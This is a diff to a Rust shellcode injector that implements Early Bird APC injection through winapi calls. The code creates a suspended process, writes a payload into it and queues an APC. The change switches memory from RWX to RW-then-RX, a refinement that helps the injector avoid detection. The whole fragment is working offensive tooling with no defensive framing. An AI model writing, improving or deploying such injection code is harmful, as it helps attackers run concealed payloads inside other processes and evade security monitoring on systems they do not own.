@@ -12,8 +12,8 @@ pub struct EarlyBirdInjector;
 impl Injector for EarlyBirdInjector {
     fn inject(&self, _pid: u32, payload: &[u8]) -> Result<()> {
         use winapi::um::processthreadsapi::{CreateProcessW, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW};
-        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
         use winapi::um::winbase::CREATE_SUSPENDED;
         use winapi::um::handleapi::CloseHandle;
 
@@ -42,7 +42,8 @@ impl Injector for EarlyBirdInjector {
                 return Err(anyhow!("EarlyBird: CreateProcessW failed"));
             }
 
-            let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            // Allocate RW, write, then switch to RX to avoid RWX pages
+            let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if remote_mem.is_null() {
                 winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                 CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
@@ -55,6 +56,10 @@ impl Injector for EarlyBirdInjector {
                 CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                 return Err(anyhow!("EarlyBird: WriteProcessMemory failed"));
             }
+
+            // Switch to execute-read before queuing the APC
+            let mut old_prot = 0u32;
+            VirtualProtectEx(pi.hProcess, remote_mem, payload.len(), PAGE_EXECUTE_READ, &mut old_prot);
 
             // QueueUserAPC: the callback is called when the thread enters an
             // alertable wait state.  Since the thread hasn't started yet, it
